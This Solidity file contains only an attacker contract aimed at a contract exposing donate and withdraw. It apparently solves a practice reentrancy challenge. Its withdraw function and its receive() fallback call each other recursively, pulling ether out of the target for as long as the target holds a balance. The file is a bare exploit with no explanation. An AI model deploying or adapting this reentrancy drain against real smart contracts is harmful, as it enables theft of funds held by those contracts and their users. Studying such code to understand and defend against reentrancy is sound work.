// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;


interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract Reentrant {
    IReentrance target;
    constructor(address _target) public {
        target = IReentrance(_target);
    }

    function withdraw() public payable {
        if(address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }

    receive() external payable {
        withdraw();
    }
}

